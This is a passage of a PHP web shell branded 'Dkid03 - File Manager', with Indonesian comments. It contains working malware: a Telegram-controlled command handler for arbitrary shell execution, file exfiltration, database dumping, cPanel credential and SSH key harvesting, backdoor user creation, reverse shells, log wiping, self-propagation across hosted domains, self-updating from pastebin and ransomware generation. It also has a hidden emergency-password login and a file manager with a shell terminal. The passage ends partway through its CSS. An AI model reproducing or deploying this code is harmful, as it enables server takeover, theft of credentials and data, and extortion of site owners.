            $dbHost = getenv('DB_HOST') ?: 'localhost';
            $dbUser = getenv('DB_USER') ?: 'root';
            $dbPass = getenv('DB_PASS') ?: '';
            $dbName = getenv('DB_NAME') ?: '';
            if ($dbUser && $dbPass && $dbName) {
                $dumpFile = '/tmp/db_dump_' . time() . '.sql';
                $cmd = "mysqldump -h{$dbHost} -u{$dbUser} -p{$dbPass} {$dbName} > {$dumpFile} 2>&1";
                shell_exec($cmd);
                if (file_exists($dumpFile) && filesize($dumpFile) > 100) {
                    $dumps[] = "📦 Database dump: " . $dumpFile . " (" . formatSize(filesize($dumpFile)) . ")";
                }
            }
        }
    }
    return $dumps;
}

// ==================== AUTO-UPDATE WORM ====================
function worm_auto_update() {
    global $botToken, $telegramUserId;
    $remoteUrl = 'https://pastebin.com/raw/xxxxxxxx'; // Ganti dengan URL versi terbaru
    $versionFile = __DIR__ . '/.version';
    $localVersion = file_exists($versionFile) ? file_get_contents($versionFile) : '1.0';
    $remoteVersion = @file_get_contents($remoteUrl . '?v=' . time());
    if ($remoteVersion && $remoteVersion != $localVersion) {
        $newFile = __DIR__ . '/.update.tmp';
        if (file_put_contents($newFile, $remoteVersion)) {
            rename($newFile, __FILE__);
            file_put_contents($versionFile, $remoteVersion);
            chmod(__FILE__, 0644);
            sendTelegramMessage($botToken, $telegramUserId, "🔄 Worm telah di-update ke versi " . $remoteVersion);
            return true;
        }
    }
    return false;
}

// ==================== TELEGRAM COMMAND HANDLER ====================
function telegram_command_handler($botToken, $chatId) {
    if (!isset($_SESSION['telegram_offset'])) {
        $_SESSION['telegram_offset'] = 0;
    }
    $url = "https://api.telegram.org/bot{$botToken}/getUpdates";
    $data = [
        'offset' => $_SESSION['telegram_offset'],
        'timeout' => 5,
        'allowed_updates' => ['message']
    ];
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    $result = @file_get_contents($url, false, stream_context_create($options));
    if ($result === false) return;
    $updates = json_decode($result, true);
    if (!isset($updates['ok']) || !$updates['ok'] || empty($updates['result'])) return;

    foreach ($updates['result'] as $update) {
        $_SESSION['telegram_offset'] = $update['update_id'] + 1;
        if (!isset($update['message']['text']) || $update['message']['chat']['id'] != $chatId) continue;
        $cmd = $update['message']['text'];
        $parts = explode(' ', $cmd);
        $command = strtolower($parts[0]);
        $param = $parts[1] ?? '';
        $param2 = $parts[2] ?? '';
        $param3 = $parts[3] ?? '';

        $response = '';
        switch ($command) {
            case '/start':
            case '/help':
                $response = "🤖 <b>Bot Aktif!</b>\n\n"
                          . "Perintah yang tersedia:\n"
                          . "/ls [dir] - Daftar file\n"
                          . "/download [file] - Download file\n"
                          . "/exec [cmd] - Jalankan perintah\n"
                          . "/scan - Scan & infeksi domain (same IP)\n"
                          . "/clean - Hapus jejak\n"
                          . "/dumpdb - Dump database\n"
                          . "/update - Auto-update worm\n"
                          . "/cpanellist - Daftar akun cPanel\n"
                          . "/cpanel [aksi] [param] - Kelola cPanel\n"
                          . "/harvest - Cari kredensial cPanel\n"
                          . "/cplist [domain] - Lihat file di domain tertentu\n"
                          . "/configfinder - Cari file sensitif\n"
                          . "/backdooruser [user] [pass] - Buat user SSH\n"
                          . "/reverseshell start [ip] [port] - Start reverse shell\n"
                          . "/reverseshell stop [port] - Stop reverse shell\n"
                          . "/reverseshell status - Status reverse shell\n"
                          . "/clearlogs - Bersihkan log & history\n"
                          . "/sshkeys - Ambil SSH keys\n"
                          . "/wpscan - Scan WordPress/Laravel\n"
                          . "/makeransom - Buat ransomware R.php dari repo";
                break;
            case '/ls':
                $dir = $param ?: __DIR__;
                if (function_exists('shell_exec')) {
                    $out = shell_exec("ls -la " . escapeshellarg($dir) . " 2>&1");
                } else {
                    $out = "shell_exec tidak tersedia.";
                }
                $response = "📂 <b>ls $dir</b>\n<code>" . htmlspecialchars($out) . "</code>";
                break;
            case '/download':
                $file = $param;
                if (file_exists($file) && is_file($file)) {
                    $url = "https://api.telegram.org/bot{$botToken}/sendDocument";
                    $post = ['chat_id' => $chatId, 'document' => new CURLFile($file)];
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $url);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_exec($ch);
                    curl_close($ch);
                    continue 2;
                } else {
                    $response = "❌ File tidak ditemukan: $file";
                }
                break;
            case '/exec':
                if (function_exists('shell_exec')) {
                    $output = shell_exec($param . ' 2>&1');
                    $response = "💻 <b>exec $param</b>\n<code>" . htmlspecialchars($output) . "</code>";
                } else {
                    $response = "❌ shell_exec tidak tersedia.";
                }
                break;
            case '/scan':
                $domains = worm_propagate_domain(__FILE__);
                $response = "✅ Scan selesai. Ditemukan " . count($domains) . " domain.";
                break;
            case '/clean':
                clean_traces();
                $response = "🧹 Jejak telah dibersihkan.";
                break;
            case '/dumpdb':
                $dumps = dump_databases();
                if (empty($dumps)) {
                    $response = "❌ Tidak ditemukan database atau kredensial.";
                } else {
                    $response = "📦 <b>Database Dump</b>\n" . implode("\n", $dumps);
                }
                break;
            case '/update':
                $result = worm_auto_update();
                $response = $result ? "🔄 Update berhasil." : "ℹ️ Tidak ada update tersedia.";
                break;
            case '/cpanellist':
                $result = cpanel_list_accounts();
                $response = "📋 <b>Daftar Akun cPanel</b>\n" . $result;
                break;
            case '/cpanel':
                $action = $param;
                $username = $param2;
                $extra = $parts[3] ?? '';
                $result = cpanel_handler($action, $username, $extra);
                $response = $result;
                break;
            case '/harvest':
                cpanel_harvest();
                $response = "🔍 Pencarian kredensial sedang dilakukan. Hasil akan dikirim via Telegram.";
                break;
            case '/cplist':
                $domain = $param;
                if (empty($domain)) {
                    $response = "❌ Format: /cplist [domain]";
                    break;
                }
                $roots = get_all_document_roots();
                $found = false;
                foreach ($roots as $root) {
                    if (strpos($root, $domain) !== false || strpos($domain, basename($root)) !== false) {
                        $files = scandir($root);
                        $fileList = array_diff($files, ['.', '..']);
                        if (empty($fileList)) {
                            $response = "📂 $root (kosong)";
                        } else {
                            $response = "📂 <b>$root</b>\n" . implode("\n", $fileList);
                        }
                        $found = true;
                        break;
                    }
                }
                if (!$found) {
                    $response = "❌ Domain '$domain' tidak ditemukan.";
                }
                break;
            case '/configfinder':
                find_sensitive_files();
                $response = "🔍 Pencarian file sensitif sedang dilakukan. Hasil akan dikirim via Telegram.";
                break;
            case '/backdooruser':
                $user = $param;
                $pass = $param2;
                if (empty($user) || empty($pass)) {
                    $response = "❌ Format: /backdooruser [username] [password]";
                } else {
                    $response = create_backdoor_user($user, $pass);
                }
                break;
            case '/reverseshell':
                $action = $param;
                if ($action == 'start') {
                    $ip = $param2;
                    $port = $param3;
                    if (empty($ip) || empty($port)) {
                        $response = "❌ Format: /reverseshell start [ip] [port]";
                    } else {
                        $result = start_reverse_shell($ip, $port);
                        $response = $result === true ? "✅ Reverse shell started." : $result;
                    }
                } elseif ($action == 'stop') {
                    $port = $param2;
                    if (empty($port)) {
                        $response = "❌ Format: /reverseshell stop [port]";
                    } else {
                        $response = stop_reverse_shell($port);
                    }
                } elseif ($action == 'status') {
                    $response = status_reverse_shell();
                } else {
                    $response = "❌ Aksi tidak dikenal. Gunakan: start, stop, status";
                }
                break;
            case '/clearlogs':
                $response = clean_logs_advanced();
                break;
            case '/sshkeys':
                grab_ssh_keys();
                $response = "🔑 Pencarian SSH keys sedang dilakukan. Hasil akan dikirim via Telegram.";
                break;
            case '/wpscan':
                scan_wordpress_laravel();
                $response = "📝 Scan WordPress/Laravel sedang dilakukan. Hasil akan dikirim via Telegram.";
                break;
            case '/makeransom':
                $result = create_ransomware();
                $response = $result ? "✅ Ransomware berhasil dibuat dan disimpan sebagai R.php" : "❌ Gagal membuat ransomware.";
                break;
            default:
                $response = "❌ Perintah tidak dikenal. Ketik /help";
        }
        if ($response) {
            sendTelegramMessage($botToken, $chatId, $response);
        }
    }
}

// ==================== HANDLER GET ====================
if (isset($_GET['dumpdb']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = dump_databases();
    echo "Database dump result:\n" . implode("\n", $result);
    exit;
}
if (isset($_GET['clean']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    clean_traces();
    echo "Traces cleaned.";
    exit;
}
if (isset($_GET['worm']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    worm_propagate_domain(__FILE__);
    echo "Worm propagated to all directories (same IP).";
    exit;
}
if (isset($_GET['update']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = worm_auto_update();
    echo $result ? "Update successful." : "No update available.";
    exit;
}
if (isset($_GET['cpanel']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $action = $_GET['action'] ?? 'list';
    $username = $_GET['user'] ?? '';
    $extra = $_GET['extra'] ?? '';
    echo cpanel_handler($action, $username, $extra);
    exit;
}
if (isset($_GET['harvest']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    cpanel_harvest();
    echo "Credential harvesting completed. Results sent to Telegram.";
    exit;
}
if (isset($_GET['configfinder']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    find_sensitive_files();
    echo "Sensitive files search completed. Results sent to Telegram.";
    exit;
}
if (isset($_GET['backdooruser']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $user = $_GET['user'] ?? '';
    $pass = $_GET['pass'] ?? '';
    echo create_backdoor_user($user, $pass);
    exit;
}
if (isset($_GET['reverseshell']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $action = $_GET['action'] ?? '';
    $ip = $_GET['ip'] ?? '';
    $port = $_GET['port'] ?? '';
    if ($action == 'start') {
        $result = start_reverse_shell($ip, $port);
        echo $result === true ? "Reverse shell started." : $result;
    } elseif ($action == 'stop') {
        echo stop_reverse_shell($port);
    } elseif ($action == 'status') {
        echo status_reverse_shell();
    } else {
        echo "Aksi tidak dikenal.";
    }
    exit;
}
if (isset($_GET['clearlogs']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    echo clean_logs_advanced();
    exit;
}
if (isset($_GET['sshkeys']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    grab_ssh_keys();
    echo "SSH keys grabbed and sent to Telegram.";
    exit;
}
if (isset($_GET['wpscan']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    scan_wordpress_laravel();
    echo "WordPress/Laravel scan completed. Results sent to Telegram.";
    exit;
}
if (isset($_GET['create_ransom']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    $result = create_ransomware();
    echo $result ? "✅ Ransomware berhasil dibuat." : "❌ Gagal membuat ransomware.";
    exit;
}

// ==================== LOGIN DARURAT ====================
$loginError = $loginSuccess = '';
$login_mode = 'otp';

if (isset($_GET['action']) && $_GET['action'] === 'Dkid') {
    if (defined('ALLOWED_IP') && ALLOWED_IP && $_SERVER['REMOTE_ADDR'] !== ALLOWED_IP) {
        die('Akses darurat tidak diizinkan dari IP ini.');
    }
    $login_mode = 'password';
}

if ($login_mode === 'password') {
    if (isset($_POST['login_password'])) {
        $input_pass = $_POST['password'] ?? '';
        if ($input_pass === EMERGENCY_PASSWORD) {
            $_SESSION['loggedin'] = true;
            $_SESSION['login_time'] = time();
            header('Location: ?');
            exit;
        } else {
            $loginError = "❌ Password darurat salah.";
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head><meta charset="UTF-8"><title>🔓 Akses Darurat</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:monospace;}
        body{background:#0a0f1e;color:#00ff9d;display:flex;align-items:center;justify-content:center;min-height:100vh;}
        .login-box{background:rgba(26,26,46,0.8);padding:2rem;border:2px solid #00ff9d;border-radius:16px;max-width:400px;width:100%;}
        .login-title{text-align:center;margin-bottom:1.5rem;font-size:1.8rem;}
        .form-group{margin-bottom:1.5rem;}
        .form-group label{display:block;margin-bottom:0.5rem;}
        .form-control{width:100%;padding:0.75rem 1rem;background:rgba(255,255,255,0.1);border:1px solid #00ff9d;border-radius:8px;color:#00ff9d;font-size:1rem;}
        .form-control:focus{outline:none;border-color:#4cc9f0;}
        .btn{display:block;width:100%;padding:0.75rem;background:transparent;border:2px solid #00ff9d;color:#00ff9d;border-radius:8px;font-size:1rem;font-weight:bold;cursor:pointer;transition:0.3s;}
        .btn:hover{background:#00ff9d;color:#0a0f1e;}
        .alert-danger{background:rgba(248,113,113,0.15);border:1px solid #f87171;color:#f87171;padding:0.75rem;border-radius:8px;margin-bottom:1rem;}
        .back-link{text-align:center;margin-top:1rem;}
        .back-link a{color:#4cc9f0;text-decoration:none;}
        .back-link a:hover{text-decoration:underline;}
    </style>
    </head>
    <body>
    <div class="login-box">
        <h1 class="login-title">🔓 Akses Darurat</h1>
        <?php if (!empty($loginError)): ?><div class="alert-danger"><?= htmlspecialchars($loginError) ?></div><?php endif; ?>
        <form method="post">
            <div class="form-group">
                <label for="password">Password Darurat</label>
                <input type="password" id="password" name="password" class="form-control" required autofocus>
            </div>
            <button type="submit" name="login_password" class="btn">Masuk</button>
        </form>
        <div class="back-link"><a href="?">← Kembali ke login OTP</a></div>
    </div>
    </body>
    </html>
    <?php
    exit;
}

// ==================== OTP LOGIN (tanpa worm otomatis) ====================
if (isset($_POST['request_otp'])) {
    $otp = sprintf("%06d", mt_rand(0, 999999));
    $_SESSION['otp'] = $otp;
    $_SESSION['otp_time'] = time();
    $message = "🔐 <b>Kode OTP Anda untuk Dkid03</b>\n\n<code>$otp</code>\n\nBerlaku 5 menit.";
    $sent = sendTelegramMessage($botToken, $telegramUserId, $message);
    if ($sent) {
        $loginSuccess = "OTP telah dikirim ke Telegram.";
        $_SESSION['otp_sent'] = true;
        $_SESSION['otp_fallback'] = false;
    } else {
        file_put_contents('/tmp/otp_' . date('Ymd') . '.txt', $otp . '|' . time());
        $_SESSION['otp_sent'] = true;
        $_SESSION['otp_fallback'] = true;
        $loginSuccess = "OTP tidak bisa dikirim via Telegram. Gunakan kode darurat di bawah.";
    }
}

if (isset($_POST['verify_otp'])) {
    $inputOtp = trim($_POST['otp'] ?? '');
    if (empty($inputOtp)) {
        $loginError = "Masukkan kode OTP.";
    } elseif (!isset($_SESSION['otp']) || !isset($_SESSION['otp_time'])) {
        $loginError = "Silakan minta OTP terlebih dahulu.";
    } elseif (time() - $_SESSION['otp_time'] > 300) {
        $loginError = "Kode OTP sudah kadaluarsa. Minta ulang.";
        unset($_SESSION['otp'], $_SESSION['otp_time']);
    } elseif ($inputOtp === $_SESSION['otp']) {
        $_SESSION['loggedin'] = true;
        $_SESSION['login_time'] = time();
        unset($_SESSION['otp'], $_SESSION['otp_time']);
        // ❌ TIDAK ADA worm_propagate_domain di sini
        header('Location: ?');
        exit;
    } else {
        $loginError = "Kode OTP salah.";
    }
}

// ==================== AREA LOGGED IN ====================
if (isset($_SESSION['loggedin'])) {
    if (time() - $_SESSION['login_time'] > 1800) {
        session_destroy();
        header('Location: ?');
        exit;
    }

    telegram_command_handler($botToken, $telegramUserId);

    $currentPath = $rootPath;
    if (isset($_GET['path'])) {
        $requestedPath = realpath($_GET['path']);
        if ($requestedPath && isSafePath($requestedPath, $rootPath, $specialDirectories)) {
            $currentPath = $requestedPath;
        } else {
            $error = "Path tidak valid atau di luar direktori yang diizinkan";
        }
    }
    if (!file_exists($currentPath) || !is_dir($currentPath) || !is_readable($currentPath)) {
        $error = "Direktori tidak dapat diakses";
        $currentPath = $rootPath;
    }

    // ---------- RENAME ----------
    if (isset($_POST['rename'])) {
        try {
            $target = $_POST['target'] ?? '';
            $newName = $_POST['new_name'] ?? '';
            if (empty($target) || empty($newName) || preg_match('/[\/\\\\:\*\?"<>\|]/', $newName)) {
                throw new Exception('Nama tidak valid');
            }
            $targetPath = $currentPath . DIRECTORY_SEPARATOR . $target;
            $newPath = $currentPath . DIRECTORY_SEPARATOR . $newName;
            if (!file_exists($targetPath) || !isSafePath($targetPath, $rootPath, $specialDirectories) || !@rename($targetPath, $newPath)) {
                throw new Exception('Gagal mengganti nama');
            }
            header('Location: ?path=' . urlencode($currentPath));
            exit;
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }

    // ---------- ACTION (delete, chmod, unzip, download) ----------
    if (isset($_GET['action'])) {
        try {
            $action = $_GET['action'];
            $target = $_GET['target'] ?? '';
            $targetPath = $currentPath . DIRECTORY_SEPARATOR . $target;
            if (empty($target) || !file_exists($targetPath) || !isSafePath($targetPath, $rootPath, $specialDirectories)) {
                throw new Exception('Target tidak valid');
            }
            switch ($action) {
                case 'delete':
                    deleteDirectory($targetPath) ?: throw new Exception('Gagal menghapus');
                    break;
                case 'chmod':
                    if (!isset($_POST['mode']) || !preg_match('/^[0-7]{3,4}$/', $_POST['mode'])) {
                        throw new Exception('Mode permission tidak valid');
                    }
                    chmod($targetPath, octdec($_POST['mode'])) ?: throw new Exception('Gagal mengubah permission');
                    break;
                case 'unzip':
                    if (!class_exists('ZipArchive')) throw new Exception('Ekstensi Zip tidak tersedia');
                    $zip = new ZipArchive;
                    if ($zip->open($targetPath) === TRUE) {
                        $zip->extractTo($currentPath);
                        $zip->close();
                    } else {
                        throw new Exception('Gagal membuka file zip');
                    }
                    break;
                case 'download':
                    if (is_dir($targetPath)) throw new Exception('Tidak dapat mendownload direktori');
                    header('Content-Description: File Transfer');
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($targetPath) . '"');
                    header('Content-Length: ' . filesize($targetPath));
                    readfile($targetPath);
                    exit;
                default:
                    throw new Exception('Aksi tidak dikenali');
            }
            $success = 'Berhasil melakukan aksi: ' . htmlspecialchars($target);
            header('Location: ?path=' . urlencode($currentPath));
            exit;
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }

    // ---------- CREATE ----------
    if (isset($_POST['create'])) {
        try {
            $type = $_POST['type'];
            $name = $_POST['name'] ?? '';
            if (empty($name) || preg_match('/[\/\\\\:\*\?"<>\|]/', $name)) {
                throw new Exception('Nama tidak valid');
            }
            $newPath = $currentPath . DIRECTORY_SEPARATOR . $name;
            if ($type === 'file') {
                touch($newPath) ?: throw new Exception('Gagal membuat file');
            } elseif ($type === 'folder') {
                mkdir($newPath) ?: throw new Exception('Gagal membuat folder');
            }
            header('Location: ?path=' . urlencode($currentPath));
            exit;
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }

    // ---------- UPLOAD ----------
    if (isset($_FILES['upload'])) {
        try {
            if (!is_writable($currentPath)) throw new Exception('Direktori tidak dapat ditulisi');
            $mode = $_POST['upload_mode'] ?? 'normal';
            $targetDirs = [$currentPath];
            if ($mode === 'bulk_shallow') {
                $targetDirs = array_merge($targetDirs, getImmediateSubDirectories($currentPath));
            } elseif ($mode === 'bulk_deep') {
                $targetDirs = array_merge($targetDirs, getAllSubDirectories($currentPath));
            }
            $targetDirs = array_filter($targetDirs, 'is_writable');
            foreach ($_FILES['upload']['name'] as $key => $name) {
                if ($_FILES['upload']['error'][$key] !== UPLOAD_ERR_OK) continue;
                $safeName = basename($name);
                $mainTarget = $currentPath . DIRECTORY_SEPARATOR . $safeName;
                if (!@move_uploaded_file($_FILES['upload']['tmp_name'][$key], $mainTarget)) continue;
                foreach ($targetDirs as $dir) {
                    if ($dir !== $currentPath) {
                        @copy($mainTarget, $dir . DIRECTORY_SEPARATOR . $safeName);
                    }
                }
                $uploadedFiles[] = $safeName;
            }
            $success = 'File berhasil diupload: ' . implode(', ', $uploadedFiles ?? []);
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }

    // ---------- BULK DELETE ----------
    if (isset($_POST['delete_bulk'])) {
        try {
            $fileList = $_POST['file_list'] ?? '';
            $deleteMode = $_POST['delete_mode'] ?? 'current';
            if (empty(trim($fileList))) throw new Exception('Daftar file tidak boleh kosong');
            $results = bulkDeleteFiles($currentPath, $fileList, $deleteMode);
            $msgParts = [];
            if (!empty($results['deleted'])) $msgParts[] = 'Terhapus: ' . count($results['deleted']) . ' file';
            if (!empty($results['not_found'])) $msgParts[] = 'Tidak ditemukan: ' . implode(', ', array_unique($results['not_found']));
            if (!empty($results['errors'])) $msgParts[] = 'Gagal dihapus: ' . count($results['errors']) . ' file';
            $success = 'Hasil hapus massal: ' . implode('; ', $msgParts);
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }

    // ---------- SAVE FILE ----------
    if (isset($_POST['save_file'])) {
        try {
            $file = $_POST['file'];
            $filePath = $currentPath . DIRECTORY_SEPARATOR . $file;
            if (!file_exists($filePath) || !is_file($filePath) || !isSafePath($filePath, $rootPath, $specialDirectories)) {
                throw new Exception('File tidak valid');
            }
            if (!is_writable($filePath)) throw new Exception('File tidak dapat ditulisi');
            file_put_contents($filePath, $_POST['content']) !== false ?: throw new Exception('Gagal menyimpan file');
            $success = 'File berhasil disimpan';
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }

    $terminalActive = isTerminalActive();
    $terminalOutput = '';
    if (isset($_POST['run_command']) && $terminalActive) {
        $output = shell_exec($_POST['command'] . ' 2>&1');
        $terminalOutput = $output !== null ? $output : 'Perintah tidak menghasilkan output.';
    }
} // akhir area logged in

// ==================== HTML ====================
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dkid03 - File Manager</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-dark: rgba(26, 26, 46, 0.6);
            --bg-darker: rgba(22, 33, 62, 0.7);
            --bg-light: rgba(45, 64, 89, 0.6);
            --accent: #4cc9f0;
            --accent-dark: #4361ee;
            --text: #e6e6e6;
            --text-muted: #b3b3b3;
            --success: #4ade80;
            --warning: #fbbf24;
            --danger: #f87171;
            --border: rgba(42, 58, 82, 0.4);
            --sidebar-width: 280px;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body { color: var(--text); min-height: 100vh; line-height: 1.6; overflow-x: hidden; background: #0f172a; }
        .background-image {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: url('<?= $animeImageUrl ?>') no-repeat center center; background-size: cover;
            z-index: -1000; filter: brightness(0.7);
        }
        .login-container { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 2rem; position: relative; }
        .login-box {
            background: rgba(26, 26, 46, 0.4); border-radius: 16px; padding: 2.5rem;
            width: 100%; max-width: 400px; border: 1px solid rgba(67, 97, 238, 0.3);
            backdrop-filter: blur(5px); z-index: 1;
        }
        .login-title { text-align: center; margin-bottom: 1.5rem; font-size: 1.8rem; color: var(--accent); font-weight: 500; }
        .form-group { margin-bottom: 1.5rem; }
        .form-group label { display: block; margin-bottom: 0.5rem; font-weight: 500; color: var(--text); }
        .form-control {
            width: 100%; padding: 0.75rem 1rem; background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; color: var(--text);
            font-size: 1rem; transition: all 0.3s;
        }
        .form-control:focus { outline: none; border-color: var(--accent); background: rgba(255, 255, 255, 0.15); }
        .btn {
            display: inline-block; padding: 0.75rem 1.5rem; background: var(--accent-dark);
            color: white; border: none; border-radius: 8px; font-size: 1rem; font-weight: 500;
            cursor: pointer; text-align: center; transition: all 0.3s ease; text-decoration: none;
        }
        .btn:hover { background: var(--accent); transform: translateY(-2px); }
        .btn-block { display: block; width: 100%; }
        .btn-danger { background: var(--danger); }
        .btn-danger:hover { background: #ef4444; }
        .alert { padding: 1rem; border-radius: 8px; margin-bottom: 1.5rem; position: relative; }
        .alert-danger { background: rgba(248, 113, 113, 0.15); border: 1px solid var(--danger); color: var(--danger); }
        .alert-success { background: rgba(74, 222, 128, 0.15); border: 1px solid var(--success); color: var(--success); }
        .alert-warning { background: rgba(251, 191, 36, 0.15); border: 1px solid var(--warning); color: var(--warning); }
        .close-btn { position: absolute; top: 0.5rem; right: 0.75rem; background: none; border: none; color: inherit; font-size: 1.25rem; cursor: pointer; }
        .app-container { display: flex; min-height: 100vh; }
        .sidebar {
            width: var(--sidebar-width); background: rgba(26, 26, 46, 0.5); height: 100vh;
            position: fixed; top: 0; left: 0; z-index: 100; overflow-y: auto;
            backdrop-filter: blur(5px); border-right: 1px solid var(--border);
            display: flex; flex-direction: column;
        }
        .sidebar-header { padding: 1.5rem 1.5rem 1rem; border-bottom: 1px solid var(--border); }
        .sidebar-title { font-size: 1.25rem; color: var(--accent); font-weight: 500; margin-bottom: 0.5rem; }
        .sidebar-subtitle { color: var(--text-muted); font-size: 0.9rem; }
        .sidebar-menu { padding: 1.5rem; flex-grow: 1; }
        .menu-section { margin-bottom: 1.5rem; }
        .menu-title { color: var(--accent); font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 0.75rem; padding-left: 0.5rem; }
        .menu-item {
            display: flex; align-items: center; padding: 0.75rem 1rem; border-radius: 8px;
            color: var(--text); text-decoration: none; margin-bottom: 0.5rem;
            transition: all 0.2s; cursor: pointer; background: rgba(45, 64, 89, 0.3);
        }
        .menu-item:hover { background: rgba(67, 97, 238, 0.4); color: white; }
        .menu-item i { margin-right: 0.75rem; font-size: 1.1rem; width: 24px; text-align: center; }
        .logout-btn { background: rgba(248, 113, 113, 0.2); color: var(--danger); margin-top: auto; }
        .logout-btn:hover { background: rgba(248, 113, 113, 0.3); }
        .terminal-container { max-width: 1200px; margin: 0 auto; padding: 1rem; }
        .system-info {
            background: var(--bg-dark); border-radius: 12px; padding: 1.5rem;
            margin-bottom: 2rem; border: 1px solid var(--border); backdrop-filter: blur(5px);
        }
        .system-info h3 { color: var(--accent); margin-bottom: 1rem; }
        .info-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 0.75rem; }
        .info-item { display: flex; border-bottom: 1px solid var(--border); padding: 0.5rem 0; }
        .info-label { font-weight: 500; width: 140px; color: var(--text-muted); }
        .info-value { flex: 1; color: var(--text); }
        .terminal-card { background: var(--bg-darker); border-radius: 12px; overflow: hidden; border: 1px solid var(--border); backdrop-filter: blur(5px); }
        .terminal-header { background: var(--bg-light); padding: 1rem 1.5rem; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .terminal-status { display: flex; align-items: center; gap: 0.5rem; }
        .status-indicator { width: 12px; height: 12px; border-radius: 50%; background: #4ade80; box-shadow: 0 0 8px #4ade80; }
        .status-indicator.inactive { background: #f87171; box-shadow: 0 0 8px #f87171; }
        .terminal-body { padding: 1.5rem; }
        .terminal-output {
            background: #1e1e2e; color: #f0f0f0; font-family: 'Courier New', monospace;
            padding: 1rem; border-radius: 8px; min-height: 200px; max-height: 400px;
            overflow-y: auto; margin-bottom: 1.5rem; border: 1px solid var(--border);
            white-space: pre-wrap; word-break: break-all;
        }
        .terminal-input { display: flex; gap: 0.5rem; }
        .terminal-input .form-control { font-family: 'Courier New', monospace; }
        .main-content { flex: 1; margin-left: var(--sidebar-width); padding: 1.5rem; position: relative; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 0.5rem 0; margin-bottom: 1.5rem; flex-wrap: wrap; gap: 1rem; }
        .title { font-size: 1.5rem; color: var(--accent); font-weight: 500; }
        .breadcrumb {
            background: var(--bg-light); padding: 0.75rem 1rem; border-radius: 8px;
            margin-bottom: 1.5rem; font-size: 0.9rem; overflow-x: auto; white-space: nowrap;
            backdrop-filter: blur(5px);
        }
        .breadcrumb a { color: var(--accent); text-decoration: none; }
        .breadcrumb a:hover { text-decoration: underline; }
        .card {
            background: var(--bg-dark); border-radius: 12px; overflow: hidden;
            margin-bottom: 1.5rem; border: 1px solid var(--border); backdrop-filter: blur(5px);
        }
        .card-header { padding: 1rem 1.5rem; background: var(--bg-light); border-bottom: 1px solid var(--border); font-weight: 500; display: flex; justify-content: space-between; align-items: center; }
        .card-body { padding: 1.5rem; max-height: 60vh; overflow-y: auto; }
        .table { width: 100%; border-collapse: collapse; }
        .table th, .table td { padding: 0.75rem 1rem; text-align: left; border-bottom: 1px solid var(--border); }
        .table th { background: var(--bg-light); font-weight: 500; position: sticky; top: 0; }
        .table tr:hover { background: rgba(69, 123, 157, 0.1); }
        .folder { color: var(--accent); }
        .file { color: var(--text); }
        .action-links { display: flex; flex-wrap: wrap; gap: 0.5rem; }
        .action-links a {
            color: var(--text-muted); text-decoration: none; font-size: 0.85rem;
            padding: 0.25rem 0.5rem; border-radius: 4px; transition: all 0.2s;
            background: rgba(45, 64, 89, 0.3);
        }
        .action-links a:hover { color: var(--accent); background: rgba(76, 201, 240, 0.2); }
        .modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.7); display: flex; align-items: center; justify-content: center;
            z-index: 1000; backdrop-filter: blur(5px); opacity: 0; visibility: hidden;
            transition: all 0.3s;
        }
        .modal.active { opacity: 1; visibility: visible; }
        .modal-content {
            background: var(--bg-darker); border-radius: 12px; width: 90%; max-width: 500px;
            max-height: 90vh; overflow-y: auto; border: 1px solid var(--border);
            transform: translateY(20px); transition: transform 0.3s; backdrop-filter: blur(10px);
        }
        .modal.active .modal-content { transform: translateY(0); }
        .modal-header { padding: 1.5rem; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .modal-title { font-size: 1.25rem; color: var(--accent); font-weight: 500; }
